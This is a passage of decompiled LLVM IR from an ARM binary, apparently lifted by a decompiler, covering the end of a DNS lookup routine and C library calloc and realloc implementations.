  %v2_1be38 = bitcast i32* %stack_var_-84 to i8*
  %v3_1be38 = call i32 @__GI_memset(i8* %v2_1be38, i32 0)
  store i32 %v3_1be38, i32* %r0.global-to-local, align 4
  %v2_1be40 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1be40, i32* @sb, align 4
  %v7_1be80 = icmp eq i32 %tmp9, 5
  br label %dec_label_pc_1be44

dec_label_pc_1be44:                               ; preds = %dec_label_pc_1be98, %dec_label_pc_1be28
  store i32 %v2_1be40, i32* %r2.global-to-local, align 4
  store i32 %v2_1be28, i32* %r3.global-to-local, align 4
  %v0_1be50 = load i32, i32* @r5, align 4
  store i32 %v0_1be50, i32* %r0.global-to-local, align 4
  %v4_1be54 = inttoptr i32 %v0_1be50 to i8*
  %v5_1be54 = call i32 @__dns_lookup(i8* %v4_1be54, i32 28, i32 %v2_1be40, i32 %v2_1be28)
  store i32 %v5_1be54, i32* @r4, align 4
  %v1_1be58 = icmp slt i32 %v5_1be54, 0
  %v0_1be5c = load i32, i32* @sl, align 4
  store i32 %v0_1be5c, i32* %r2.global-to-local, align 4
  %v0_1be60 = load i32, i32* @r7, align 4
  %v1_1be60 = add i32 %v0_1be60, 1
  store i32 %v1_1be60, i32* @r7, align 4
  %v0_1be64 = load i32, i32* @r5, align 4
  store i32 %v0_1be64, i32* %r0.global-to-local, align 4
  br i1 %v1_1be58, label %dec_label_pc_1bf20, label %dec_label_pc_1be6c

dec_label_pc_1be6c:                               ; preds = %dec_label_pc_1be44
  %v3_1be6c = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1be6c, i32* @r1, align 4
  %v3_1be70 = call i32 @strncpy(i32 %v0_1be64, i32 %v3_1be6c, i32 %v0_1be5c)
  %v3_1be74 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1be74, i32* @r0, align 4
  %v0_1be78 = call i32 @free()
  store i32 %v0_1be78, i32* %r0.global-to-local, align 4
  %v0_1be84 = load i32, i32* @r4, align 4
  store i32 %v0_1be84, i32* %r2.global-to-local, align 4
  %v0_1be88 = load i32, i32* @r5, align 4
  store i32 %v0_1be88, i32* @r3, align 4
  br i1 %v7_1be80, label %dec_label_pc_1be90, label %dec_label_pc_1bec8

dec_label_pc_1be90:                               ; preds = %dec_label_pc_1be6c
  %v0_1be90 = load i32, i32* @r7, align 4
  %v8_1be94 = icmp sgt i32 %v0_1be90, 5
  br i1 %v8_1be94, label %dec_label_pc_1bebc, label %dec_label_pc_1be98

dec_label_pc_1be98:                               ; preds = %dec_label_pc_1be90
  store i32 %tmp8, i32* @r1, align 4
  %v3_1be9c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1be9c, i32* %r0.global-to-local, align 4
  %v0_1bea0 = load i32, i32* @sl, align 4
  %v5_1bea4 = call i32 @__decode_dotted(i32 %v3_1be9c, i32 %tmp8, i32 %v0_1be84, i32 %v0_1be88, i32 %v0_1bea0)
  store i32 %v5_1bea4, i32* @r4, align 4
  %v3_1beac = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1beac, i32* @r0, align 4
  %v0_1beb0 = call i32 @free()
  store i32 %v0_1beb0, i32* %r0.global-to-local, align 4
  %v0_1beb4 = load i32, i32* @r4, align 4
  %v1_1beb4 = icmp slt i32 %v0_1beb4, 0
  br i1 %v1_1beb4, label %dec_label_pc_1bebc, label %dec_label_pc_1be44

dec_label_pc_1bebc:                               ; preds = %dec_label_pc_1be98, %dec_label_pc_1be90
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1bf28

dec_label_pc_1bec8:                               ; preds = %dec_label_pc_1be6c
  %v7_1bec8 = icmp eq i32 %tmp9, 28
  br i1 %v7_1bec8, label %dec_label_pc_1bed0, label %dec_label_pc_1bf18

dec_label_pc_1bed0:                               ; preds = %dec_label_pc_1bec8
  store i32 16, i32* @r2, align 4
  %v0_1bed8 = load i32, i32* @r8, align 4
  store i32 %v0_1bed8, i32* @r0, align 4
  %v0_1bedc = call i32 @memcpy()
  store i32 10, i32* %r3.global-to-local, align 4
  store i32 %v1_1bdb0, i32* %r2.global-to-local, align 4
  %v1_1bee8 = load i32, i32* @r6, align 4
  %v2_1bee8 = add i32 %v1_1bee8, 8
  %v3_1bee8 = inttoptr i32 %v2_1bee8 to i32*
  store i32 10, i32* %v3_1bee8, align 4
  %v0_1beec = load i32, i32* %r3.global-to-local, align 4
  %v1_1beec = add i32 %v0_1beec, 6
  store i32 %v1_1beec, i32* %r3.global-to-local, align 4
  %v1_1bef0 = load i32, i32* @r6, align 4
  %v2_1bef0 = add i32 %v1_1bef0, 12
  %v3_1bef0 = inttoptr i32 %v2_1bef0 to i32*
  store i32 %v1_1beec, i32* %v3_1bef0, align 4
  %v3_1bef4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1bef4, i32* @r0, align 4
  %v0_1bef8 = load i32, i32* @r5, align 4
  %v1_1bef8 = load i32, i32* @r6, align 4
  %v2_1bef8 = inttoptr i32 %v1_1bef8 to i32*
  store i32 %v0_1bef8, i32* %v2_1bef8, align 4
  %v0_1befc = load i32, i32* %r2.global-to-local, align 4
  %v1_1befc = load i32, i32* @r6, align 4
  %v2_1befc = add i32 %v1_1befc, 16
  %v3_1befc = inttoptr i32 %v2_1befc to i32*
  store i32 %v0_1befc, i32* %v3_1befc, align 4
  %v0_1bf00 = call i32 @free()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1bf10 = load i32, i32* @r6, align 4
  store i32 %v0_1bf10, i32* %v2_1bcf4, align 4
  %v0_1bf28.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1bf28

dec_label_pc_1bf18:                               ; preds = %dec_label_pc_1bec8
  %v3_1bf18 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1bf18, i32* @r0, align 4
  %v0_1bf1c = call i32 @free()
  store i32 %v0_1bf1c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bf20

dec_label_pc_1bf20:                               ; preds = %dec_label_pc_1be44, %dec_label_pc_1be20, %dec_label_pc_1bf18
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1bf28

dec_label_pc_1bf28:                               ; preds = %dec_label_pc_1bed0, %dec_label_pc_1bebc, %dec_label_pc_1bf20
  %v0_1bf28 = phi i32 [ %v0_1bf28.pre, %dec_label_pc_1bed0 ], [ 3, %dec_label_pc_1bebc ], [ 1, %dec_label_pc_1bf20 ]
  %v1_1bf28 = load i32, i32* @fp, align 4
  %v2_1bf28 = inttoptr i32 %v1_1bf28 to i32*
  store i32 %v0_1bf28, i32* %v2_1bf28, align 4
  br label %dec_label_pc_1bf34

dec_label_pc_1bf30:                               ; preds = %dec_label_pc_1bce8, %dec_label_pc_1bcfc
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bf34

dec_label_pc_1bf34:                               ; preds = %bb, %bb30, %dec_label_pc_1bd70, %dec_label_pc_1bd54, %dec_label_pc_1bf28, %dec_label_pc_1bdf0, %dec_label_pc_1bcc8, %dec_label_pc_1bf30
  store i32 %v9_1bca0, i32* @r6, align 4
  store i32 %v12_1bca0, i32* @r7, align 4
  store i32 %v15_1bca0, i32* @r8, align 4
  store i32 %v18_1bca0, i32* @sb, align 4
  store i32 %v21_1bca0, i32* @sl, align 4
  store i32 %v24_1bca0, i32* @fp, align 4
  %v1_1bf3c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1bf3c

; uselistorder directives
  uselistorder i32 %v2_1be28, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1bdb0, { 2, 1, 0, 3 }
  uselistorder i32 %v1_1bd84, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 2, 0, 3 }
  uselistorder i32 %tmp8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 22, 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 12, 10, 11, 14, 13, 15, 17, 16, 18, 20, 19, 21, 23 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 1, 0, 2 }
  uselistorder i32 -24, { 1, 0 }
  uselistorder i32 %arg6, { 4, 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1bf34, { 7, 4, 5, 1, 2, 3, 0, 6 }
  uselistorder label %dec_label_pc_1bf30, { 1, 0 }
  uselistorder label %dec_label_pc_1bf28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1bf20, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1bd80, { 2, 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_1bf40 = load i32, i32* @r4, align 4
  %v6_1bf40 = load i32, i32* @r5, align 4
  %v9_1bf40 = load i32, i32* @r6, align 4
  %v12_1bf40 = load i32, i32* @lr, align 4
  %v2_1bf48 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_1bf58 = mul i32 %arg2, %arg1
  store i32 %v2_1bf58, i32* @r6, align 4
  br i1 %v2_1bf48, label %dec_label_pc_1bf88, label %dec_label_pc_1bf60

dec_label_pc_1bf60:                               ; preds = %entry
  %v2_1bf68 = udiv i32 %v2_1bf58, %arg1
  %v9_1bf6c = icmp eq i32 %v2_1bf68, %arg2
  br i1 %v9_1bf6c, label %dec_label_pc_1bf88, label %dec_label_pc_1bf74

dec_label_pc_1bf74:                               ; preds = %dec_label_pc_1bf60
  %v0_1bf74 = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1bf80 = inttoptr i32 %v0_1bf74 to i32*
  store i32 12, i32* %v2_1bf80, align 4
  br label %dec_label_pc_1c04c

dec_label_pc_1bf88:                               ; preds = %dec_label_pc_1bf60, %entry
  %v4_1bf8c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 76) to i32*), align 4
  store i32 %v4_1bf8c, i32* @r4, align 4
  %v4_1bfa4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 80) to i32*), align 4
  store i32 %v4_1bfa4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1bfa4)
  %v0_1bfb8 = load i32, i32* @r5, align 4
  %v2_1bfb8 = add i32 %v0_1bfb8, 20
  %v3_1bfb8 = inttoptr i32 %v2_1bfb8 to i32*
  %v4_1bfb8 = load i32, i32* %v3_1bfb8, align 4
  store i32 %v4_1bfb8, i32* %ip.global-to-local, align 4
  store i32 114628, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1bfb8)
  %v0_1bfc4 = load i32, i32* @r6, align 4
  %v1_1bfc8 = call i32 @malloc(i32 %v0_1bfc4)
  store i32 %v1_1bfc8, i32* %r4.global-to-local, align 4
  %v2_1bfcc = icmp eq i32 %v1_1bfc8, 0
  br i1 %v2_1bfcc, label %.thread, label %dec_label_pc_1bfd4

dec_label_pc_1bfd4:                               ; preds = %dec_label_pc_1bf88
  %v1_1bfd4 = add i32 %v1_1bfc8, -4
  %v2_1bfd4 = inttoptr i32 %v1_1bfd4 to i32*
  %v3_1bfd4 = load i32, i32* %v2_1bfd4, align 4
  %v1_1bfd8 = and i32 %v3_1bfd4, 2
  %v2_1bfd8 = icmp eq i32 %v1_1bfd8, 0
  br i1 %v2_1bfd8, label %dec_label_pc_1bfe0, label %.thread

dec_label_pc_1bfe0:                               ; preds = %dec_label_pc_1bfd4
  %v1_1bfe06 = add i32 %v3_1bfd4, -4
  %v1_1bfe4 = and i32 %v1_1bfe06, -4
  store i32 %v1_1bfe4, i32* @r2, align 4
  %v3_1bfe8 = udiv i32 %v1_1bfe4, 4
  store i32 %v3_1bfe8, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_1bfe4, 36
  %v2_1bff0 = icmp ult i32 %v1_1bfe4, 33
  %v3_1bff0 = or i1 %tmp, %v2_1bff0
  br i1 %v3_1bff0, label %dec_label_pc_1bffc, label %dec_label_pc_1bff4

dec_label_pc_1bff4:                               ; preds = %dec_label_pc_1bfe0
  %v2_1bff4 = inttoptr i32 %v1_1bfc8 to i8*
  %v3_1bff4 = call i32 @__GI_memset(i8* %v2_1bff4, i32 0)
  br label %.thread

dec_label_pc_1bffc:                               ; preds = %dec_label_pc_1bfe0
  %tmp7 = icmp eq i32 %v1_1bfe4, 16
  %v2_1c000 = inttoptr i32 %v1_1bfc8 to i32*
  store i32 0, i32* %v2_1c000, align 4
  %v1_1c004 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c004 = add i32 %v1_1c004, 4
  %v3_1c004 = inttoptr i32 %v2_1c004 to i32*
  store i32 0, i32* %v3_1c004, align 4
  %v1_1c008 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c008 = add i32 %v1_1c008, 8
  %v3_1c008 = inttoptr i32 %v2_1c008 to i32*
  store i32 0, i32* %v3_1c008, align 4
  %v2_1c00c = icmp ult i32 %v1_1bfe4, 13
  %v3_1c00c = or i1 %tmp7, %v2_1c00c
  br i1 %v3_1c00c, label %.thread, label %dec_label_pc_1c010

dec_label_pc_1c010:                               ; preds = %dec_label_pc_1bffc
  %v0_1c010 = load i32, i32* %ip.global-to-local, align 4
  %v1_1c014 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c014 = add i32 %v1_1c014, 12
  %v3_1c014 = inttoptr i32 %v2_1c014 to i32*
  store i32 0, i32* %v3_1c014, align 4
  %v1_1c018 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c018 = add i32 %v1_1c018, 16
  %v3_1c018 = inttoptr i32 %v2_1c018 to i32*
  store i32 0, i32* %v3_1c018, align 4
  %tmp8 = icmp ult i32 %v0_1c010, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_1c020

dec_label_pc_1c020:                               ; preds = %dec_label_pc_1c010
  %v0_1c020 = load i32, i32* %ip.global-to-local, align 4
  %v7_1c020 = icmp eq i32 %v0_1c020, 9
  %v1_1c024 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c024 = add i32 %v1_1c024, 20
  %v3_1c024 = inttoptr i32 %v2_1c024 to i32*
  store i32 0, i32* %v3_1c024, align 4
  %v1_1c028 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c028 = add i32 %v1_1c028, 24
  %v3_1c028 = inttoptr i32 %v2_1c028 to i32*
  store i32 0, i32* %v3_1c028, align 4
  br i1 %v7_1c020, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1c020
  %v2_1c02c = load i32, i32* %r4.global-to-local, align 4
  %v3_1c02c = add i32 %v2_1c02c, 32
  %v4_1c02c = inttoptr i32 %v3_1c02c to i32*
  store i32 0, i32* %v4_1c02c, align 4
  %v2_1c030 = load i32, i32* %r4.global-to-local, align 4
  %v3_1c030 = add i32 %v2_1c030, 28
  %v4_1c030 = inttoptr i32 %v3_1c030 to i32*
  store i32 0, i32* %v4_1c030, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1c020, %dec_label_pc_1bfd4, %dec_label_pc_1c010, %dec_label_pc_1bffc, %dec_label_pc_1bf88, %dec_label_pc_1bff4, %bb
  %v0_1c040 = load i32, i32* @r5, align 4
  %v2_1c040 = add i32 %v0_1c040, 28
  %v3_1c040 = inttoptr i32 %v2_1c040 to i32*
  %v4_1c040 = load i32, i32* %v3_1c040, align 4
  store i32 %v4_1c040, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1c040)
  br label %dec_label_pc_1c04c

dec_label_pc_1c04c:                               ; preds = %dec_label_pc_1bf74, %.thread
  %v0_1c04c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_1bf40, i32* @r4, align 4
  store i32 %v6_1bf40, i32* @r5, align 4
  store i32 %v9_1bf40, i32* @r6, align 4
  store i32 %v12_1bf40, i32* @lr, align 4
  ret i32 %v0_1c04c

; uselistorder directives
  uselistorder i32 %v1_1bfe4, { 0, 5, 1, 4, 3, 2 }
  uselistorder i32 %v1_1bfc8, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 13, { 0, 3, 4, 6, 5, 1, 8, 2, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1c04c, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_1c060(i32 %arg1) local_unnamed_addr {
dec_label_pc_1c060:
  %v0_1c060 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1c060, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1c060
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1c060, %bb
  %v10_1c070 = phi i32 [ %arg1, %dec_label_pc_1c060 ], [ 0, %bb ]
  ret i32 %v10_1c070

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_1c074 = load i32, i32* @r4, align 4
  %v6_1c074 = load i32, i32* @r5, align 4
  %v9_1c074 = load i32, i32* @r6, align 4
  %v12_1c074 = load i32, i32* @r7, align 4
  %v15_1c074 = load i32, i32* @r8, align 4
  %v18_1c074 = load i32, i32* @sb, align 4
  %v21_1c074 = load i32, i32* @sl, align 4
  %v24_1c074 = load i32, i32* @fp, align 4
  %v27_1c074 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_1c080 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1c080, label %dec_label_pc_1c094, label %dec_label_pc_1c0a4

dec_label_pc_1c094:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_1c098 = call i32 @malloc(i32 %arg2)
  store i32 %v1_1c098, i32* %r0.global-to-local, align 4
  store i32 %v1_1c098, i32* @r4, align 4
  br label %dec_label_pc_1c3fc

dec_label_pc_1c0a4:                               ; preds = %entry
  %v2_1c0a4 = icmp eq i32 %arg2, 0
  br i1 %v2_1c0a4, label %dec_label_pc_1c0ac, label %dec_label_pc_1c0b8

dec_label_pc_1c0ac:                               ; preds = %dec_label_pc_1c0a4
  %v0_1c0ac = call i32 @free()
  store i32 %v0_1c0ac, i32* %r0.global-to-local, align 4
  %v0_1c0b0 = load i32, i32* @r6, align 4
  store i32 %v0_1c0b0, i32* @r4, align 4
  br label %dec_label_pc_1c3fc

dec_label_pc_1c0b8:                               ; preds = %dec_label_pc_1c0a4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_1c0c0 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 76) to i32*), align 4
  store i32 %v4_1c0c0, i32* @r4, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 %v4_1c0c0, i32* %r2.global-to-local, align 4
  %v4_1c0cc = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 40) to i32*), align 4
  store i32 %v4_1c0cc, i32* %r1.global-to-local, align 4
  %v2_1c0d0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1c0d0, i32* %r0.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v4_1c0d8 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1c0d8)
  %v0_1c0e4 = load i32, i32* @r4, align 4
  store i32 %v0_1c0e4, i32* %r0.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %r1.global-to-local, align 4
  %v4_1c0f0 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 20) to i32*), align 4
  store i32 %v4_1c0f0, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_1c0fc.1206 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1c0f0)
  %v0_1c0fc = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_1c0fc, -32
  br i1 %tmp36, label %dec_label_pc_1c118, label %dec_label_pc_1c104

dec_label_pc_1c104:                               ; preds = %dec_label_pc_1c0b8
  %v0_1c104 = call i32 @__GI___errno_location()
  store i32 %v0_1c104, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1c110 = inttoptr i32 %v0_1c104 to i32*
  store i32 12, i32* %v2_1c110, align 4
  br label %dec_label_pc_1c3fc

dec_label_pc_1c118:                               ; preds = %dec_label_pc_1c0b8
  %v1_1c118 = add i32 %v0_1c0fc, 11
  store i32 %v1_1c118, i32* %r0.global-to-local, align 4
  %v0_1c11c = load i32, i32* @r5, align 4
  %v1_1c11c = add i32 %v0_1c11c, -4
  %v2_1c11c = inttoptr i32 %v1_1c11c to i32*
  %v3_1c11c = load i32, i32* %v2_1c11c, align 4
  store i32 %v3_1c11c, i32* %r2.global-to-local, align 4
  %v2_1c120 = icmp ugt i32 %v1_1c118, 14
  %v7_1c120 = icmp eq i32 %v1_1c118, 15
  %v2_1c124 = xor i1 %v2_1c120, true
  %v3_1c124 = or i1 %v7_1c120, %v2_1c124
  br i1 %v3_1c124, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_1c118
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_1c118, %bb
  %v2_1c128 = xor i1 %v7_1c120, true
  %v3_1c128 = and i1 %v2_1c120, %v2_1c128
  br i1 %v3_1c128, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_1c128 = and i32 %v1_1c118, -8
  store i32 %v5_1c128, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_1c12c = and i32 %v3_1c11c, 2
  %v2_1c12c = icmp eq i32 %v1_1c12c, 0
  %v1_1c130 = add i32 %v0_1c11c, -8
  store i32 %v1_1c130, i32* @sl, align 4
  %v1_1c134 = and i32 %v3_1c11c, -4
  store i32 %v1_1c134, i32* @r6, align 4
  br i1 %v2_1c12c, label %dec_label_pc_1c13c, label %dec_label_pc_1c314

dec_label_pc_1c13c:                               ; preds = %bb29
  %v1_1c13c = load i32, i32* @sb, align 4
  %v3_1c13c = icmp ult i32 %v1_1c134, %v1_1c13c
  br i1 %v3_1c13c, label %dec_label_pc_1c148, label %bb30

bb30:                                             ; preds = %dec_label_pc_1c13c
  store i32 %v1_1c134, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c2ac

dec_label_pc_1c148:                               ; preds = %dec_label_pc_1c13c
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_1c150 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 36) to i32*), align 4
  store i32 %v4_1c150, i32* %r0.global-to-local, align 4
  %v1_1c154 = add i32 %v4_1c150, 44
  %v2_1c154 = inttoptr i32 %v1_1c154 to i32*
  %v3_1c154 = load i32, i32* %v2_1c154, align 4
  store i32 %v3_1c154, i32* %r3.global-to-local, align 4
  %v2_1c158 = add i32 %v1_1c134, %v1_1c130
  store i32 %v2_1c158, i32* @r4, align 4
  %v9_1c15c = icmp eq i32 %v2_1c158, %v3_1c154
  %v1_1c160 = add i32 %v2_1c158, 4
  %v2_1c160 = inttoptr i32 %v1_1c160 to i32*
  %v3_1c160 = load i32, i32* %v2_1c160, align 4
  store i32 %v3_1c160, i32* %r1.global-to-local, align 4
  br i1 %v9_1c15c, label %dec_label_pc_1c168, label %dec_label_pc_1c1a4

dec_label_pc_1c168:                               ; preds = %dec_label_pc_1c148
  %v1_1c168 = and i32 %v3_1c160, -4
  %v2_1c16c = add i32 %v1_1c168, %v1_1c134
  store i32 %v2_1c16c, i32* %r1.global-to-local, align 4
  %v1_1c170 = add i32 %v1_1c13c, 16
  store i32 %v1_1c170, i32* %r3.global-to-local, align 4
  %v3_1c174 = icmp ult i32 %v2_1c16c, %v1_1c170
  br i1 %v3_1c174, label %dec_label_pc_1c1f8, label %dec_label_pc_1c17c

dec_label_pc_1c17c:                               ; preds = %dec_label_pc_1c168
  %v2_1c17c = sub i32 %v2_1c16c, %v1_1c13c
  %v1_1c180 = urem i32 %v3_1c11c, 2
  %v2_1c184 = add i32 %v1_1c13c, %v1_1c130
  store i32 %v2_1c184, i32* %r1.global-to-local, align 4
  %v2_1c188 = or i32 %v1_1c13c, %v1_1c180
  store i32 %v2_1c188, i32* %r2.global-to-local, align 4
  %v1_1c18c = or i32 %v2_1c17c, 1
  store i32 %v1_1c18c, i32* %r3.global-to-local, align 4
  store i32 %v0_1c11c, i32* @r4, align 4
  store i32 %v2_1c188, i32* %v2_1c11c, align 4
  %v0_1c198 = load i32, i32* %r1.global-to-local, align 4
  %v1_1c198 = load i32, i32* %r0.global-to-local, align 4
  %v2_1c198 = add i32 %v1_1c198, 44
  %v3_1c198 = inttoptr i32 %v2_1c198 to i32*
  store i32 %v0_1c198, i32* %v3_1c198, align 4
  %v0_1c19c = load i32, i32* %r3.global-to-local, align 4
  %v1_1c19c = load i32, i32* %r1.global-to-local, align 4
  %v2_1c19c = add i32 %v1_1c19c, 4
  %v3_1c19c = inttoptr i32 %v2_1c19c to i32*
  store i32 %v0_1c19c, i32* %v3_1c19c, align 4
  br label %dec_label_pc_1c3e0

dec_label_pc_1c1a4:                               ; preds = %dec_label_pc_1c148
  %v1_1c1a4 = and i32 %v3_1c160, -2
  %v2_1c1a8 = add i32 %v1_1c1a4, %v2_1c158
  store i32 %v2_1c1a8, i32* %r3.global-to-local, align 4
  %v1_1c1ac = add i32 %v2_1c1a8, 4
  %v2_1c1ac = inttoptr i32 %v1_1c1ac to i32*
  %v3_1c1ac = load i32, i32* %v2_1c1ac, align 4
  store i32 %v3_1c1ac, i32* %r3.global-to-local, align 4
  %v1_1c1b0 = urem i32 %v3_1c1ac, 2
  %v2_1c1b0 = icmp eq i32 %v1_1c1b0, 0
  br i1 %v2_1c1b0, label %dec_label_pc_1c1b8, label %dec_label_pc_1c1f8

dec_label_pc_1c1b8:                               ; preds = %dec_label_pc_1c1a4
  %v1_1c1b8 = and i32 %v3_1c160, -4
  store i32 %v1_1c1b8, i32* %r3.global-to-local, align 4
  %v2_1c1bc = add i32 %v1_1c1b8, %v1_1c134
  store i32 %v2_1c1bc, i32* %r0.global-to-local, align 4
  %v3_1c1c0 = icmp ult i32 %v2_1c1bc, %v1_1c13c
  br i1 %v3_1c1c0, label %dec_label_pc_1c1f8, label %dec_label_pc_1c1c8

dec_label_pc_1c1c8:                               ; preds = %dec_label_pc_1c1b8
  %v1_1c1c8 = add i32 %v1_1c134, %v0_1c11c
  %v2_1c1c8 = inttoptr i32 %v1_1c1c8 to i32*
  %v3_1c1c8 = load i32, i32* %v2_1c1c8, align 4
  store i32 %v3_1c1c8, i32* %r1.global-to-local, align 4
  %v1_1c1cc = add i32 %v3_1c1c8, 12
  %v2_1c1cc = inttoptr i32 %v1_1c1cc to i32*
  %v3_1c1cc = load i32, i32* %v2_1c1cc, align 4
  store i32 %v3_1c1cc, i32* %r3.global-to-local, align 4
  %v9_1c1d0 = icmp eq i32 %v3_1c1cc, %v2_1c158
  %v1_1c1d4 = add i32 %v2_1c158, 12
  %v2_1c1d4 = inttoptr i32 %v1_1c1d4 to i32*
  %v3_1c1d4 = load i32, i32* %v2_1c1d4, align 4
  store i32 %v3_1c1d4, i32* %r2.global-to-local, align 4
  br i1 %v9_1c1d0, label %dec_label_pc_1c1dc, label %dec_label_pc_1c1e8

dec_label_pc_1c1dc:                               ; preds = %dec_label_pc_1c1c8
  %v1_1c1dc = add i32 %v3_1c1d4, 8
  %v2_1c1dc = inttoptr i32 %v1_1c1dc to i32*
  %v3_1c1dc = load i32, i32* %v2_1c1dc, align 4
  store i32 %v3_1c1dc, i32* %r3.global-to-local, align 4
  %v9_1c1e0 = icmp eq i32 %v3_1c1dc, %v2_1c158
  br i1 %v9_1c1e0, label %dec_label_pc_1c1ec, label %dec_label_pc_1c1e8

dec_label_pc_1c1e8:                               ; preds = %dec_label_pc_1c1c8, %dec_label_pc_1c1dc
  %v0_1c1e8 = call i32 @abort()
  store i32 %v0_1c1e8, i32* %r0.global-to-local, align 4
  %v0_1c1ec.pre = load i32, i32* @r1, align 4
  %v1_1c1ec.pre = load i32, i32* @r2, align 4
